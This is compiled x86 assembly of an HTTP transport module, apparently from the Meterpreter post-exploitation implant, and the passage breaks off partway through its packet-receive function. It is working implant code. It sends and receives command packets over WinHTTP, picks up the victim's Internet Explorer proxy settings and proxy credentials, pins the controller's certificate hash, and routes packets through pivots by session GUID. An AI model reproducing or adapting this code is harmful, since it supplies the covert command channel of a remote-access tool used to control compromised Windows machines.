	.file	"server_transport_winhttp.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%esi
	pushl	%ebx
	subl	$1072, %esp
	movl	__imp__GetCurrentThreadId@0, %eax
	call	*%eax
	movl	%eax, 16(%esp)
	movl	$LC0, 12(%esp)
	movl	$1023, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___snprintf_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	call	_strlen
	movl	%eax, -12(%ebp)
	leal	12(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %ecx
	movl	$1021, %eax
	subl	-12(%ebp), %eax
	movl	%eax, %edx
	movl	$1024, %eax
	subl	-12(%ebp), %eax
	leal	-1040(%ebp), %esi
	movl	-12(%ebp), %ebx
	addl	%esi, %ebx
	movl	%ecx, 16(%esp)
	movl	8(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%ebx, (%esp)
	call	_vsnprintf_s
	movl	$LC1, 8(%esp)
	movl	$1024, 4(%esp)
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__strcat_s, %eax
	call	*%eax
	leal	-1040(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__OutputDebugStringA@4, %eax
	call	*%eax
	subl	$4, %esp
	nop
	leal	-8(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%ebp
	ret
	.section .rdata,"dr"
LC2:
	.ascii "[%s] Setting secure flag..\0"
	.align 4
LC3:
	.ascii "[%s] opening request on connection %x to %S\0"
	.align 2
LC4:
	.ascii "G\0E\0T\0\0\0"
	.align 2
LC5:
	.ascii "P\0O\0S\0T\0\0\0"
	.align 4
LC6:
	.ascii "[%s] Failed WinHttpOpenRequest: %u\0"
LC7:
	.ascii "[PROXY] Got IE configuration\0"
LC8:
	.ascii "yes\0"
LC9:
	.ascii "no\0"
LC10:
	.ascii "[PROXY] AutoDetect: %s\0"
LC11:
	.ascii "[PROXY] Auto URL: %S\0"
LC12:
	.ascii "[PROXY] Proxy: %S\0"
LC13:
	.ascii "[PROXY] Proxy Bypass: %S\0"
	.align 4
LC14:
	.ascii "[PROXY] IE config set to autodetect with DNS or DHCP\0"
	.align 4
LC15:
	.ascii "[PROXY] IE config set to autodetect with URL %S\0"
	.align 4
LC16:
	.ascii "[PROXY] IE config set to proxy %S with bypass %S\0"
	.align 4
LC17:
	.ascii "[%s] Unable to set proxy options: %u\0"
	.align 4
LC18:
	.ascii "[%s] Setting proxy username to %S\0"
	.align 4
LC19:
	.ascii "[%s] Failed to set username %u\0"
	.align 4
LC20:
	.ascii "[%s] Setting proxy password to %S\0"
	.align 4
LC21:
	.ascii "[%s] Failed to set password %u\0"
	.align 4
LC22:
	.ascii "[%s] failed to set the security flags on the request\0"
	.text
	.def	_get_request_winhttp;	.scl	3;	.type	32;	.endef
_get_request_winhttp:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$100, %esp
	movl	$0, -12(%ebp)
	movl	$256, -20(%ebp)
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L3
	movl	-20(%ebp), %eax
	orl	$8388608, %eax
	movl	%eax, -20(%ebp)
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC2, (%esp)
	call	_real_dprintf
L3:
	movl	8(%ebp), %eax
	movl	24(%eax), %edx
	movl	8(%ebp), %eax
	movl	8(%eax), %eax
	movl	%edx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC3, (%esp)
	call	_real_dprintf
	movl	-20(%ebp), %ecx
	movl	8(%ebp), %eax
	movl	24(%eax), %edx
	cmpl	$0, 12(%ebp)
	je	L4
	movl	$LC4, %ebx
	jmp	L5
L4:
	movl	$LC5, %ebx
L5:
	movl	8(%ebp), %eax
	movl	8(%eax), %eax
	movl	%ecx, 24(%esp)
	movl	$0, 20(%esp)
	movl	$0, 16(%esp)
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%ebx, 4(%esp)
	movl	%eax, (%esp)
	call	_WinHttpOpenRequest@28
	subl	$28, %esp
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	jne	L6
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 8(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC6, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, %eax
	jmp	L26
L6:
	movl	8(%ebp), %eax
	movl	32(%eax), %eax
	testl	%eax, %eax
	jne	L8
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	testl	%eax, %eax
	jne	L9
	movl	$0, -36(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -24(%ebp)
	leal	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpGetIEProxyConfigForCurrentUser@4
	subl	$4, %esp
	testl	%eax, %eax
	je	L10
	movl	$LC7, (%esp)
	call	_real_dprintf
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	je	L11
	movl	$LC8, %eax
	jmp	L12
L11:
	movl	$LC9, %eax
L12:
	movl	%eax, 4(%esp)
	movl	$LC10, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC11, (%esp)
	call	_real_dprintf
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC12, (%esp)
	call	_real_dprintf
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC13, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	testl	%eax, %eax
	jne	L13
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	je	L14
L13:
	movl	$0, %ecx
	movl	$24, %eax
	andl	$-4, %eax
	movl	%eax, %edx
	movl	$0, %eax
L15:
	movl	%ecx, -60(%ebp,%eax)
	addl	$4, %eax
	cmpl	%edx, %eax
	jb	L15
	movl	$0, -72(%ebp)
	movl	$0, -68(%ebp)
	movl	$0, -64(%ebp)
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	je	L17
	movl	$LC14, (%esp)
	call	_real_dprintf
	movl	$1, -60(%ebp)
	movl	$3, -56(%ebp)
	movl	$0, -52(%ebp)
	jmp	L18
L17:
	movl	-32(%ebp), %eax
	testl	%eax, %eax
	je	L18
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC15, (%esp)
	call	_real_dprintf
	movl	$2, -60(%ebp)
	movl	$0, -56(%ebp)
	movl	-32(%ebp), %eax
	movl	%eax, -52(%ebp)
L18:
	movl	$1, -40(%ebp)
	movl	8(%ebp), %eax
	movl	16(%eax), %edx
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	leal	-72(%ebp), %ecx
	movl	%ecx, 12(%esp)
	leal	-60(%ebp), %ecx
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_WinHttpGetProxyForUrl@16
	subl	$16, %esp
	testl	%eax, %eax
	je	L27
	movl	$12, (%esp)
	call	_malloc
	movl	%eax, %edx
	movl	8(%ebp), %eax
	movl	%edx, 52(%eax)
	movl	8(%ebp), %eax
	movl	52(%eax), %eax
	movl	-72(%ebp), %edx
	movl	%edx, (%eax)
	movl	-68(%ebp), %edx
	movl	%edx, 4(%eax)
	movl	-64(%ebp), %edx
	movl	%edx, 8(%eax)
	jmp	L27
L14:
	movl	-28(%ebp), %eax
	testl	%eax, %eax
	je	L20
	movl	$12, 4(%esp)
	movl	$1, (%esp)
	call	_calloc
	movl	%eax, -16(%ebp)
	movl	8(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, 52(%eax)
	movl	-24(%ebp), %edx
	movl	-28(%ebp), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC16, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	movl	$3, (%eax)
	movl	-28(%ebp), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 4(%eax)
	movl	-24(%ebp), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 8(%eax)
	movl	$0, -28(%ebp)
	movl	$0, -24(%ebp)
	jmp	L20
L27:
	nop
L20:
	movl	-32(%ebp), %eax
	testl	%eax, %eax
	je	L21
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GlobalFree@4, %eax
	call	*%eax
	subl	$4, %esp
L21:
	movl	-28(%ebp), %eax
	testl	%eax, %eax
	je	L22
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GlobalFree@4, %eax
	call	*%eax
	subl	$4, %esp
L22:
	movl	-24(%ebp), %eax
	testl	%eax, %eax
	je	L10
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GlobalFree@4, %eax
	call	*%eax
	subl	$4, %esp
L10:
	movl	8(%ebp), %eax
	movl	$1, 48(%eax)
L9:
	movl	8(%ebp), %eax
	movl	52(%eax), %eax
	testl	%eax, %eax
	je	L23
	movl	8(%ebp), %eax
	movl	52(%eax), %eax
	movl	$12, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$38, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpSetOption@16
	subl	$16, %esp
	testl	%eax, %eax
	jne	L23
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC17, (%esp)
	call	_real_dprintf
	jmp	L23
L8:
	movl	8(%ebp), %eax
	movl	36(%eax), %eax
	testl	%eax, %eax
	je	L24
	movl	8(%ebp), %eax
	movl	36(%eax), %eax
	movl	%eax, 8(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC18, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	36(%eax), %eax
	movl	%eax, (%esp)
	call	_wcslen
	movl	8(%ebp), %edx
	movl	36(%edx), %edx
	movl	%eax, 12(%esp)
	movl	%edx, 8(%esp)
	movl	$4098, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpSetOption@16
	subl	$16, %esp
	testl	%eax, %eax
	jne	L24
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 8(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC19, (%esp)
	call	_real_dprintf
L24:
	movl	8(%ebp), %eax
	movl	40(%eax), %eax
	testl	%eax, %eax
	je	L23
	movl	8(%ebp), %eax
	movl	40(%eax), %eax
	movl	%eax, 8(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC20, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	40(%eax), %eax
	movl	%eax, (%esp)
	call	_wcslen
	movl	8(%ebp), %edx
	movl	40(%edx), %edx
	movl	%eax, 12(%esp)
	movl	%edx, 8(%esp)
	movl	$4099, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpSetOption@16
	subl	$16, %esp
	testl	%eax, %eax
	jne	L23
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 8(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC21, (%esp)
	call	_real_dprintf
L23:
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L25
	movl	$13056, -20(%ebp)
	movl	$4, 12(%esp)
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$31, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpSetOption@16
	subl	$16, %esp
	testl	%eax, %eax
	jne	L25
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC22, (%esp)
	call	_real_dprintf
L25:
	movl	-12(%ebp), %eax
L26:
	movl	-4(%ebp), %ebx
	leave
	ret
	.def	_close_request_winhttp;	.scl	3;	.type	32;	.endef
_close_request_winhttp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpCloseHandle@4
	subl	$4, %esp
	leave
	ret
	.def	_read_response_winhttp;	.scl	3;	.type	32;	.endef
_read_response_winhttp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	20(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpReadData@16
	subl	$16, %esp
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC23:
	.ascii "[WINHTTP] Sending with custom headers: %S\0"
	.text
	.def	_send_request_winhttp;	.scl	3;	.type	32;	.endef
_send_request_winhttp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L33
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC23, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	$0, 24(%esp)
	movl	20(%ebp), %edx
	movl	%edx, 20(%esp)
	movl	20(%ebp), %edx
	movl	%edx, 16(%esp)
	movl	16(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	$-1, 8(%esp)
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpSendRequest@28
	subl	$28, %esp
	jmp	L34
L33:
	movl	$0, 24(%esp)
	movl	20(%ebp), %eax
	movl	%eax, 20(%esp)
	movl	20(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpSendRequest@28
	subl	$28, %esp
L34:
	leave
	ret
	.def	_receive_response_winhttp;	.scl	3;	.type	32;	.endef
_receive_response_winhttp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	$0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpReceiveResponse@8
	subl	$8, %esp
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC24:
	.ascii "[PACKET RECEIVE WINHTTP] Getting the result code...\0"
	.align 4
LC25:
	.ascii "[PACKET RECEIVE WINHTTP] Returned status code is %d\0"
	.align 4
LC26:
	.ascii "[PACKET RECEIVE WINHTTP] validating certificate hash\0"
	.align 4
LC27:
	.ascii "[PACKET RECEIVE WINHTTP] Failed to get the certificate context: %u\0"
	.align 4
LC28:
	.ascii "[PACKET RECEIVE WINHTTP] Failed to get the certificate hash: %u\0"
	.align 4
LC29:
	.ascii "[SERVER] Server hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\0"
	.align 4
LC30:
	.ascii "[PACKET RECEIVE WINHTTP] Certificate hash doesn't match, bailing out\0"
	.text
	.def	_validate_response_winhttp;	.scl	3;	.type	32;	.endef
_validate_response_winhttp:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$220, %esp
	movl	$4, -32(%ebp)
	movl	$LC24, (%esp)
	call	_real_dprintf
	movl	$0, 20(%esp)
	leal	-32(%ebp), %eax
	movl	%eax, 16(%esp)
	leal	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$0, 8(%esp)
	movl	$536870931, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpQueryHeaders@24
	subl	$24, %esp
	testl	%eax, %eax
	je	L38
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC25, (%esp)
	call	_real_dprintf
	movl	-28(%ebp), %eax
	cmpl	$200, %eax
	je	L38
	movl	12(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	jne	L39
	movl	-28(%ebp), %eax
	cmpl	$407, %eax
	jne	L39
	movl	$12029, %eax
	jmp	L46
L39:
	movl	$1610, %eax
	jmp	L46
L38:
	movl	12(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L41
	movl	$LC26, (%esp)
	call	_real_dprintf
	movl	$0, -36(%ebp)
	movl	$4, -40(%ebp)
	leal	-40(%ebp), %eax
	movl	%eax, 12(%esp)
	leal	-36(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$78, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_WinHttpQueryOption@16
	subl	$16, %esp
	testl	%eax, %eax
	jne	L42
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC27, (%esp)
	call	_real_dprintf
	movl	$12169, %eax
	jmp	L46
L42:
	movl	$20, -44(%ebp)
	movl	-36(%ebp), %eax
	leal	-44(%ebp), %edx
	movl	%edx, 12(%esp)
	leal	-64(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__CertGetCertificateContextProperty@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	jne	L44
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC28, (%esp)
	call	_real_dprintf
	movl	$12169, %eax
	jmp	L46
L44:
	movl	12(%ebp), %eax
	movl	12(%eax), %eax
	movl	$20, 8(%esp)
	movl	%eax, 4(%esp)
	leal	-64(%ebp), %eax
	movl	%eax, (%esp)
	call	_memcmp
	testl	%eax, %eax
	je	L41
	movzbl	-45(%ebp), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movzbl	-46(%ebp), %eax
	movzbl	%al, %ecx
	movl	%ecx, -76(%ebp)
	movzbl	-47(%ebp), %eax
	movzbl	%al, %ebx
	movl	%ebx, -80(%ebp)
	movzbl	-48(%ebp), %eax
	movzbl	%al, %esi
	movl	%esi, -84(%ebp)
	movzbl	-49(%ebp), %eax
	movzbl	%al, %edi
	movl	%edi, -88(%ebp)
	movzbl	-50(%ebp), %eax
	movzbl	%al, %eax
	movl	%eax, -92(%ebp)
	movzbl	-51(%ebp), %eax
	movzbl	%al, %ecx
	movl	%ecx, -96(%ebp)
	movzbl	-52(%ebp), %eax
	movzbl	%al, %ebx
	movl	%ebx, -100(%ebp)
	movzbl	-53(%ebp), %eax
	movzbl	%al, %esi
	movl	%esi, -104(%ebp)
	movzbl	-54(%ebp), %eax
	movzbl	%al, %edi
	movl	%edi, -108(%ebp)
	movzbl	-55(%ebp), %eax
	movzbl	%al, %eax
	movl	%eax, -112(%ebp)
	movzbl	-56(%ebp), %eax
	movzbl	%al, %ecx
	movl	%ecx, -116(%ebp)
	movzbl	-57(%ebp), %eax
	movzbl	%al, %ebx
	movl	%ebx, -120(%ebp)
	movzbl	-58(%ebp), %eax
	movzbl	%al, %esi
	movl	%esi, -124(%ebp)
	movzbl	-59(%ebp), %eax
	movzbl	%al, %edi
	movzbl	-60(%ebp), %eax
	movzbl	%al, %esi
	movzbl	-61(%ebp), %eax
	movzbl	%al, %ebx
	movzbl	-62(%ebp), %eax
	movzbl	%al, %ecx
	movzbl	-63(%ebp), %eax
	movzbl	%al, %eax
	movl	%eax, -128(%ebp)
	movzbl	-64(%ebp), %eax
	movzbl	%al, %eax
	movl	%edx, 80(%esp)
	movl	-76(%ebp), %edx
	movl	%edx, 76(%esp)
	movl	-80(%ebp), %edx
	movl	%edx, 72(%esp)
	movl	-84(%ebp), %edx
	movl	%edx, 68(%esp)
	movl	-88(%ebp), %edx
	movl	%edx, 64(%esp)
	movl	-92(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-96(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-100(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-104(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-108(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-112(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-116(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-120(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-124(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-128(%ebp), %edi
	movl	%edi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC29, (%esp)
	call	_real_dprintf
	movl	$LC30, (%esp)
	call	_real_dprintf
	movl	$12169, %eax
	jmp	L46
L41:
	movl	$0, %eax
L46:
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.section .rdata,"dr"
LC31:
	.ascii "PACKET TRANSMIT\0"
	.align 4
LC32:
	.ascii "[PACKET TRANSMIT] Failed HttpSendRequest: %d\0"
	.align 4
LC33:
	.ascii "[PACKET TRANSMIT] request sent.. apparently\0"
	.text
	.def	_packet_transmit_http;	.scl	3;	.type	32;	.endef
_packet_transmit_http:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -12(%ebp)
	movl	$5, -16(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	-20(%ebp), %eax
	movl	60(%eax), %eax
	movl	$LC31, 8(%esp)
	movl	$0, 4(%esp)
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	je	L52
	movl	-20(%ebp), %eax
	movl	64(%eax), %eax
	movl	16(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-24(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -28(%ebp)
	cmpl	$0, -28(%ebp)
	jne	L50
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC32, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L49
L50:
	movl	$LC33, (%esp)
	call	_real_dprintf
	jmp	L49
L52:
	nop
L49:
	movl	-20(%ebp), %eax
	movl	68(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	-12(%ebp), %eax
	leave
	ret
	.section .rdata,"dr"
LC34:
	.ascii "PACKET RECEIVE\0"
	.align 4
LC35:
	.ascii "[PACKET RECEIVE HTTP] sending GET\0"
	.align 4
LC36:
	.ascii "[PACKET RECEIVE HTTP] Failed send_req: %d %d\0"
	.align 4
LC37:
	.ascii "[PACKET RECEIVE HTTP] Waiting to see the response ...\0"
	.align 4
LC38:
	.ascii "[PACKET RECEIVE] Failed receive: %d\0"
	.align 4
LC39:
	.ascii "[PACKET RECEIVE HTTP] Start looping through the receive calls\0"
	.align 4
LC40:
	.ascii "[PACKET RECEIVE HTTP] Failed HEADER read_response: %d\0"
	.align 4
LC41:
	.ascii "[PACKET RECEIVE NHTTP] Data received: %u bytes\0"
	.align 4
LC42:
	.ascii "[PACKET RECEIVE HTTP] headerBytes not valid\0"
	.align 4
LC43:
	.ascii "[PACKET RECEIVE HTTP] decoding header\0"
	.align 4
LC44:
	.ascii "[HTTP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]\0"
	.align 4
LC45:
	.ascii "[REC HTTP] Payload length is %d\0"
	.align 4
LC46:
	.ascii "[REC HTTP] total buffer size for the packet is %d\0"
	.align 4
LC47:
	.ascii "[REC HTTP] Failed to create the packet buffer\0"
	.align 4
LC48:
	.ascii "[REC HTTP] Allocated packet buffer at %p\0"
	.align 4
LC49:
	.ascii "[PACKET RECEIVE HTTP] reading more data from the body...\0"
	.align 4
LC50:
	.ascii "[PACKET RECEIVE] Failed BODY read_response: %d\0"
	.align 4
LC51:
	.ascii "[PACKET RECEIVE HTTP] no bytes read, bailing out\0"
	.align 4
LC52:
	.ascii "[PACKET RECEIVE HTTP] bytes read: %u\0"
	.align 4
LC53:
	.ascii "[HTTP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC54:
	.ascii "[HTTP] Session GUIDs match (or packet guid is null), decrypting packet\0"
	.align 4
LC55:
	.ascii "[HTTP] Session GUIDs don't match, looking for a pivot\0"
	.align 4
LC56:
	.ascii "[HTTP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)\0"
	.align 4
LC57:
	.ascii "[HTTP] Session GUIDs don't match, can't find pivot!\0"
LC58:
	.ascii "[HTTP] Cleaning up\0"
	.align 4
LC59:
	.ascii "[HTTP] Packet receive finished\0"
	.text
	.def	_packet_receive_http;	.scl	3;	.type	32;	.endef
_packet_receive_http:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$396, %esp
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -48(%ebp)
	movl	$1, -36(%ebp)
	movl	$0, -40(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -52(%ebp)
	movl	$5, -44(%ebp)
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_acquire
	movl	-52(%ebp), %eax
	movl	60(%eax), %eax
	movl	$LC34, 8(%esp)
	movl	$1, 4(%esp)
	movl	-52(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -56(%ebp)
	cmpl	$0, -56(%ebp)
	je	L80
	movl	$LC35, (%esp)
	call	_real_dprintf
	movl	-52(%ebp), %eax
	movl	64(%eax), %eax
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	-56(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-52(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -60(%ebp)
	cmpl	$0, -60(%ebp)
	jne	L56
	movl	__imp__WSAGetLastError@0, %eax
	call	*%eax
	movl	%eax, %ebx
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC36, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L56:
	movl	$LC37, (%esp)
	call	_real_dprintf
	movl	-52(%ebp), %eax
	movl	76(%eax), %eax
	testl	%eax, %eax
	je	L57
	movl	-52(%ebp), %eax
	movl	76(%eax), %eax
	movl	-56(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	testl	%eax, %eax
	jne	L57
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC38, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L57:
	movl	-52(%ebp), %eax
	movl	72(%eax), %eax
	movl	-52(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-56(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	testl	%eax, %eax
	jne	L81
	movl	$3, -44(%ebp)
	movl	$LC39, (%esp)
	call	_real_dprintf
	jmp	L59
L64:
	subl	$1, -44(%ebp)
	movl	-52(%ebp), %eax
	movl	80(%eax), %eax
	movl	$32, %edx
	subl	-28(%ebp), %edx
	leal	-116(%ebp), %ebx
	movl	-28(%ebp), %ecx
	addl	%ecx, %ebx
	leal	-120(%ebp), %ecx
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%ebx, 4(%esp)
	movl	-56(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	testl	%eax, %eax
	jne	L60
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC40, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L60:
	movl	-120(%ebp), %eax
	movl	%eax, 4(%esp)
